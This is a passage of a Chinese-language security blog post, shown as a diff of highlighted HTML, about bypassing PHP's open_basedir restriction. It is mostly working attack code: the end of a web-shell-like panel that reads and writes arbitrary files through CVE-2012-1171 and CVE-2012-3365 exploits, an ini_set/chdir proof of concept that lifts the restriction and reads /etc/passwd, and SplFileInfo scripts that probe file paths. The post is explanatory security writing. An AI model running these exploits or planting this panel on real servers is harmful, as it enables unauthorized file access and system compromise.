+<span class="kd">class</span> <span class="nc">DOMFileWriter</span> <span class="kd">extends</span> <span class="nc">FileWriter</span> <span class="p">{</span>
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'dom'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">version_compare</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">(),</span> <span class="s1">'5.3.10'</span><span class="p">,</span> <span class="s1">'&lt;='</span><span class="p">)</span> <span class="o">||</span> <span class="nb">version_compare</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">(),</span> <span class="s1">'5.4.0'</span><span class="p">,</span> <span class="s1">'='</span><span class="p">));</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s1">'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.'</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// set it to global resource in order to trigger RSHUTDOWN</span>
+		<span class="k">global</span> <span class="nv">$_DOM_exploit_resource</span><span class="p">;</span>
+		<span class="nb">stream_wrapper_register</span><span class="p">(</span><span class="s1">'exploit'</span><span class="p">,</span> <span class="s1">'StreamExploiter'</span><span class="p">);</span>
+		<span class="nv">$_DOM_exploit_resource</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"exploit://</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getFilePath</span><span class="p">()</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$_DOM_exploit_resource</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">DOMFileReader</span> <span class="kd">extends</span> <span class="nc">FileReader</span> <span class="p">{</span>
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'dom'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">version_compare</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">(),</span> <span class="s1">'5.3.10'</span><span class="p">,</span> <span class="s1">'&lt;='</span><span class="p">)</span> <span class="o">||</span> <span class="nb">version_compare</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">(),</span> <span class="s1">'5.4.0'</span><span class="p">,</span> <span class="s1">'='</span><span class="p">));</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s1">'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.'</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">read</span><span class="p">()</span> <span class="p">{</span>
+		<span class="c1">// set it to global resource in order to trigger RSHUTDOWN</span>
+		<span class="k">global</span> <span class="nv">$_DOM_exploit_resource</span><span class="p">;</span>
+		<span class="nb">stream_wrapper_register</span><span class="p">(</span><span class="s1">'exploit'</span><span class="p">,</span> <span class="s1">'StreamExploiter'</span><span class="p">);</span>
+		<span class="nv">$_DOM_exploit_resource</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"exploit://</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getFilePath</span><span class="p">()</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">SqliteFileWriter</span> <span class="kd">extends</span> <span class="nc">FileWriter</span> <span class="p">{</span>
+	<span class="k">function</span> <span class="n">isAvailable</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">is_writable</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">())</span>
+			<span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'sqlite3'</span><span class="p">)</span> <span class="o">||</span> <span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'sqlite'</span><span class="p">))</span>
+			<span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">version_compare</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">(),</span> <span class="s1">'5.3.15'</span><span class="p">,</span> <span class="s1">'&lt;='</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">version_compare</span><span class="p">(</span><span class="nb">phpversion</span><span class="p">(),</span> <span class="s1">'5.4.5'</span><span class="p">,</span> <span class="s1">'&lt;='</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="kc">PHP_MINOR_VERSION</span> <span class="o">==</span> <span class="mi">4</span><span class="p">));</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">getDescription</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s1">'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted'</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$sqlite_class</span> <span class="o">=</span> <span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'sqlite3'</span><span class="p">)</span> <span class="o">?</span> <span class="s1">'sqlite3'</span> <span class="o">:</span> <span class="s1">'SQLiteDatabase'</span><span class="p">;</span>
+		<span class="nb">mkdir</span><span class="p">(</span><span class="s1">':memory:'</span><span class="p">);</span>
+		<span class="nv">$payload_path</span> <span class="o">=</span> <span class="nf">getRelativePath</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">'/:memory:'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getFilePath</span><span class="p">());</span>
+		<span class="nv">$payload</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\''</span><span class="p">,</span> <span class="s1">'\'\''</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+		<span class="nv">$database</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$sqlite_class</span><span class="p">(</span><span class="s2">":memory:/</span><span class="si">{</span><span class="nv">$payload_path</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nv">$database</span><span class="o">-&gt;</span><span class="nb">exec</span><span class="p">(</span><span class="s2">"CREATE TABLE foo (bar STRING)"</span><span class="p">);</span>
+		<span class="nv">$database</span><span class="o">-&gt;</span><span class="nb">exec</span><span class="p">(</span><span class="s2">"INSERT INTO foo (bar) VALUES ('</span><span class="si">{</span><span class="nv">$payload</span><span class="si">}</span><span class="s2">')"</span><span class="p">);</span>
+		<span class="nv">$database</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
+		<span class="nb">rmdir</span><span class="p">(</span><span class="s1">':memory:'</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// End of Core</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$action</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$cwd</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cwd'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cwd'</span><span class="p">]</span> <span class="o">:</span> <span class="nb">getcwd</span><span class="p">();</span>
+<span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">,</span> <span class="no">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="mf">.</span> <span class="no">DIRECTORY_SEPARATOR</span><span class="p">;</span>
+<span class="nv">$directorLister</span> <span class="o">=</span> <span class="nf">fallback</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'GlobWrapperDirectoryLister'</span><span class="p">,</span> <span class="s1">'RealpathBruteForceDirectoryLister'</span><span class="p">));</span>
+<span class="nv">$fileWriter</span> <span class="o">=</span> <span class="nf">fallback</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'DOMFileWriter'</span><span class="p">,</span> <span class="s1">'SqliteFileWriter'</span><span class="p">));</span>
+<span class="nv">$fileReader</span> <span class="o">=</span> <span class="nf">fallback</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'DOMFileReader'</span><span class="p">));</span>
+<span class="nv">$append</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;style&gt;</span>
+<span class="nf">#panel</span> <span class="p">{</span>
+  <span class="nl">height</span><span class="p">:</span> <span class="m">200px</span><span class="p">;</span>
+  <span class="nl">overflow</span><span class="p">:</span> <span class="nb">hidden</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nf">#panel</span> <span class="o">&gt;</span> <span class="nt">pre</span> <span class="p">{</span>
+  <span class="nl">margin</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
+  <span class="nl">height</span><span class="p">:</span> <span class="m">200px</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"panel"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;pre</span> <span class="na">id=</span><span class="s">"dl"</span><span class="nt">&gt;</span>
+open_basedir: <span class="nt">&lt;span</span> <span class="na">style=</span><span class="s">"color: red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">?</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">:</span> <span class="s1">'Off'</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/span&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">style=</span><span class="s">"display:inline-block"</span> <span class="na">action=</span><span class="s">""</span><span class="nt">&gt;</span>
+<span class="nt">&lt;fieldset&gt;&lt;legend&gt;</span>Directory Listing:<span class="nt">&lt;/legend&gt;</span>Current Directory: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"cwd"</span> <span class="na">size=</span><span class="s">"100"</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$cwd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Go"</span><span class="nt">&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">get_class</span><span class="p">(</span><span class="nv">$directorLister</span><span class="p">)</span> <span class="o">===</span> <span class="s1">'RealpathBruteForceDirectoryLister'</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$characters</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'characters'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'characters'</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$directorLister</span><span class="o">-&gt;</span><span class="n">characters</span><span class="p">;</span>
+<span class="nv">$maxlength</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'maxlength'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'maxlength'</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$directorLister</span><span class="o">-&gt;</span><span class="n">maxlength</span><span class="p">;</span>
+<span class="nv">$append</span> <span class="o">=</span> <span class="s2">"&amp;characters=</span><span class="si">{</span><span class="nv">$characters</span><span class="si">}</span><span class="s2">&amp;maxlength=</span><span class="si">{</span><span class="nv">$maxlength</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="nv">$directorLister</span><span class="o">-&gt;</span><span class="nf">setMaxlength</span><span class="p">(</span><span class="nv">$maxlength</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+Search Characters: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"characters"</span> <span class="na">size=</span><span class="s">"100"</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$characters</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
+Maxlength of File: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"maxlength"</span> <span class="na">size=</span><span class="s">"1"</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$maxlength</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span><span class="cp">?&gt;</span>
+Description      : <span class="nt">&lt;strong&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$directorLister</span><span class="o">-&gt;</span><span class="nf">getDescription</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="nt">&lt;/strong&gt;</span>
+<span class="nt">&lt;/fieldset&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/pre&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$file_path</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file_path'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file_path'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;pre</span> <span class="na">id=</span><span class="s">"rf"</span><span class="nt">&gt;</span>
+open_basedir: <span class="nt">&lt;span</span> <span class="na">style=</span><span class="s">"color: red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">?</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">:</span> <span class="s1">'Off'</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/span&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">style=</span><span class="s">"display:inline-block"</span> <span class="na">action=</span><span class="s">""</span><span class="nt">&gt;</span>
+<span class="nt">&lt;fieldset&gt;&lt;legend&gt;</span>Read File :<span class="nt">&lt;/legend&gt;</span>File Path: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"file_path"</span> <span class="na">size=</span><span class="s">"100"</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$file_path</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Read"</span><span class="nt">&gt;</span>
+Description: <span class="nt">&lt;strong&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$fileReader</span><span class="o">-&gt;</span><span class="nf">getDescription</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="nt">&lt;/strong&gt;&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"action"</span> <span class="na">value=</span><span class="s">"rf"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/fieldset&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/pre&gt;</span>
+<span class="nt">&lt;pre</span> <span class="na">id=</span><span class="s">"wf"</span><span class="nt">&gt;</span>
+open_basedir: <span class="nt">&lt;span</span> <span class="na">style=</span><span class="s">"color: red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">?</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">)</span> <span class="o">:</span> <span class="s1">'Off'</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/span&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">style=</span><span class="s">"display:inline-block"</span> <span class="na">action=</span><span class="s">""</span><span class="nt">&gt;</span>
+<span class="nt">&lt;fieldset&gt;&lt;legend&gt;</span>Write File :<span class="nt">&lt;/legend&gt;</span>File Path   : <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"file_path"</span> <span class="na">size=</span><span class="s">"100"</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$file_path</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Write"</span><span class="nt">&gt;</span>
+File Content: <span class="nt">&lt;textarea</span> <span class="na">cols=</span><span class="s">"70"</span> <span class="na">name=</span><span class="s">"content"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
+Description : <span class="nt">&lt;strong&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$fileWriter</span><span class="o">-&gt;</span><span class="nf">getDescription</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="nt">&lt;/strong&gt;&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"action"</span> <span class="na">value=</span><span class="s">"wf"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/fieldset&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/pre&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#dl"</span><span class="nt">&gt;</span>Directory Listing<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#rf"</span><span class="nt">&gt;</span>Read File<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#wf"</span><span class="nt">&gt;</span>Write File<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;hr&gt;</span>
+<span class="nt">&lt;pre&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">===</span> <span class="s1">'rf'</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
+<span class="nt">&lt;plaintext&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$fileReader</span><span class="o">-&gt;</span><span class="nf">setFilePath</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$fileReader</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">===</span> <span class="s1">'wf'</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]))</span> <span class="p">{</span>
+	<span class="nv">$fileWriter</span><span class="o">-&gt;</span><span class="nf">setFilePath</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
+	<span class="nv">$fileWriter</span><span class="o">-&gt;</span><span class="nf">write</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]);</span>
+	<span class="k">echo</span> <span class="s1">'The file should be written.'</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	<span class="k">echo</span> <span class="s1">'Something goes wrong.'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">else</span><span class="o">:</span> <span class="cp">?&gt;</span>
+<span class="nt">&lt;ol&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$directorLister</span><span class="o">-&gt;</span><span class="nf">setCurrentPath</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+<span class="nv">$file_list</span> <span class="o">=</span> <span class="nv">$directorLister</span><span class="o">-&gt;</span><span class="nf">getFileList</span><span class="p">();</span>
+<span class="nv">$parent_path</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+
+<span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href='?cwd=</span><span class="si">{</span><span class="nv">$parent_path</span><span class="si">}{</span><span class="nv">$append</span><span class="si">}</span><span class="s2">#dl'&gt;Parent&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$file_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">foreach</span> <span class="p">(</span><span class="nv">$file_list</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href='?cwd=</span><span class="si">{</span><span class="nv">$cwd</span><span class="si">}{</span><span class="nv">$file</span><span class="si">}{</span><span class="nv">$append</span><span class="si">}</span><span class="s2">#dl'&gt;</span><span class="si">{</span><span class="nv">$file</span><span class="si">}</span><span class="s2">&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	<span class="k">echo</span> <span class="s1">'No files found. The path is probably not a directory.'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/ol&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h1 id="利用ini_set绕过">利用ini_set()绕过</h1>
+<h2 id="ini_set函数">ini_set()函数</h2>
+<p>ini_set()用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置。函数用法如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ini_set</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$varname</span> <span class="p">,</span> <span class="n">string</span> <span class="nv">$newvalue</span> <span class="p">)</span> <span class="o">:</span> <span class="n">string</span>
+</code></pre></div></div>
+<ul>
+  <li>varname是需要设置的值</li>
+  <li>newvalue是设置成为新的值</li>
+  <li>成功时返回旧的值，失败时返回 FALSE。</li>
+</ul>
+
+<h2 id="poc">POC</h2>
+<p>当前我们处在/var/www/html文件夹下，对应的POC为:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="s1">'Von'</span><span class="p">);</span>  <span class="c1">//创建一个目录Von</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s1">'Von'</span><span class="p">);</span>  <span class="c1">//切换到Von目录下</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span><span class="s1">'..'</span><span class="p">);</span>  <span class="c1">//把open_basedir切换到上层目录</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>  <span class="c1">//以下这三步是把目录切换到根目录</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">);</span>  <span class="c1">//设置open_basedir为根目录(此时相当于没有设置open_basedir)</span>
+<span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">);</span>  <span class="c1">//读取/etc/passwd</span>
+</code></pre></div></div>
+<p>可以看到，我们成功读取到了/etc/passwd
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedi_9.png" alt="">
+至于POC的原理涉及到了PHP的底层实现，较为复杂，具体可以参考这几篇文章。<br>
+<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#poc%E6%B5%8B%E8%AF%95">从PHP底层看open_basedir bypass</a><br>
+<a href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">php open_basedir 绕过poc分析</a><br>
+<a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a><br>
+这个我个人感觉是所有方法中最强的Payload了，思路很骚，操作也不难。(当然前提是没有被过滤掉相关函数hhhh)</p>
+
+<h1 id="利用splfileinfogetrealpath类方法绕过">利用SplFileInfo::getRealPath()类方法绕过</h1>
+<p>SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。<br>
+这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。脚本如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$info</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SplFileInfo</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$info</span><span class="o">-&gt;</span><span class="nf">getRealPath</span><span class="p">());</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>当传入的路径存在时，返回路径。
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_10.png" alt="">
+当传入的路径不存在时，返回False。
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_11.png" alt="">
+但是如果我们完全不知道路径的情况下就和暴力猜解无异了，时间花费极高。在Windows系统下可以利用&lt;&gt;来列出所需目录下的文件，有P神的POC如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">));</span>
+<span class="nv">$basedir</span> <span class="o">=</span> <span class="s1">'D:/test/'</span><span class="p">;</span>
+<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$info</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SplFileInfo</span><span class="p">(</span><span class="nv">$basedir</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'&lt;&gt;&lt;'</span><span class="p">);</span>
+    <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$info</span><span class="o">-&gt;</span><span class="nf">getRealPath</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="nv">$s</span> <span class="mf">.</span> <span class="s1">'&lt;br/&gt;'</span><span class="p">;</span>
+    <span class="nb">ob_flush</span><span class="p">();</span>
+    <span class="nb">flush</span><span class="p">();</span>
+<span class="p">}</span>
